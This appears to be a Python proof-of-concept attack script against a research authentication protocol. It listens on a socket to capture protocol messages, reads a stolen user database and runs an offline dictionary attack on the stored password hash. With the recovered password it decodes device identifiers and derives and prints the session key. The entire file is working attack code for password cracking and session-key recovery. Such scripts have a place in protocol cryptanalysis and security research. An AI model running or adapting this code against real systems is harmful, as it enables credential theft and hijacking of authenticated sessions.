import socket
import concurrent.futures
import threading
import pickle
import hashlib
import os
import time
from fuzzy_extractor import FuzzyExtractor
import base64
import random

# helper functions
def h(data: str) -> str:
    return hashlib.sha256(data.encode()).hexdigest()

def from_b64(b64_str):
        return base64.b64decode(b64_str.encode('utf-8'))

def to_b64(bytes):
	return base64.b64encode(bytes).decode("ascii")

def xor_bytes(list_of_bytes):
    max_len = max(len(b) for b in list_of_bytes)

    result = bytearray(max_len)
    for i in range(len(result)):
        result[i] = list_of_bytes[0][i] if i < len(list_of_bytes[0]) else 0

    for b in list_of_bytes[1:]:
        for i in range(len(b)):
            result[i] ^= b[i]

    return bytes(result)

def generate_random() -> str:
    return os.urandom(32).hex()


# connection settings
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host = '192.168.100.105'
port = 8911

try:
    sock.bind((host, port))
except socket.error as e:
    print(str(e))
    exit(0)

print("[+] Waiting to capture M2 (Z1, Z4, T1) and M3 (Z8, T3): ", end="", flush=True)
sock.listen(1)


cs, cs_address = sock.accept()

# Nd
Nd = cs.recv(10240).decode("utf-8")

# recv M2   
Z1 , Z4 , _ , _ , _ , _ , T1 , _= cs.recv(10240).decode("utf-8").split(",")
Z1 = from_b64(Z1)
Z4 = from_b64(Z4)

# recv M3 
Z8, _, _, _, T3 = cs.recv(10240).decode("utf-8").split(",")
Z8 = from_b64(Z8)


print("Done!")

# guessing the pass

with open("user_db", "r") as f:
     creds = f.read()

 
JIDu_prime, Id, Nu_prime, q, Qu, PIDu= creds.split(",")
JIDu_prime = from_b64(JIDu_prime)
Id = from_b64(Id)
Nu_prime = from_b64(Nu_prime)


IDu, RPWu, delta_u_hex =  Qu[:7], Qu[7:64+7], Qu[64+7:]


print("[+] Trying to find the password...")

with open("password_dic", "r") as f:
     password_list = f.read().split("\n")

for password in password_list:
    #  print("\r" + " " * 50, end="")  # Clears the line
    #  print(f"\r\tTrying for: {password}" , end="\r", flush=True)
     RPWu_guessed = h(password+q)

     if RPWu == RPWu_guessed:
          PWDu = password
          print(f"[+] PWDu is: {password}                              ")
          break
    

Id_decoded = xor_bytes( [ Id , h(IDu + PWDu + q).encode() ]).decode("utf-8")
IDd, Wm = Id_decoded[:8], Id_decoded[8:]

print(f"[+] IDd: {IDd}\tWm: {Wm}" )

JIDu = xor_bytes([JIDu_prime, h(delta_u_hex+ IDu).encode() ])


# n2 = h(IDd ∥ Nd ) ⊕ Z4
# SK
n1 = xor_bytes( [ h(to_b64(JIDu) + T1).encode(), Z1]).decode("utf-8")
n2 = xor_bytes([ h(IDd + Nd).encode(), Z4 ]).decode("utf-8")
n3 =  xor_bytes([ h(to_b64(JIDu) + T3).encode(), Z8 ]).decode("utf-8")
SK = h(to_b64(JIDu) + Wm + IDd + n1 + n2 + n3)

print("[+] SK: ", to_b64(SK.encode()))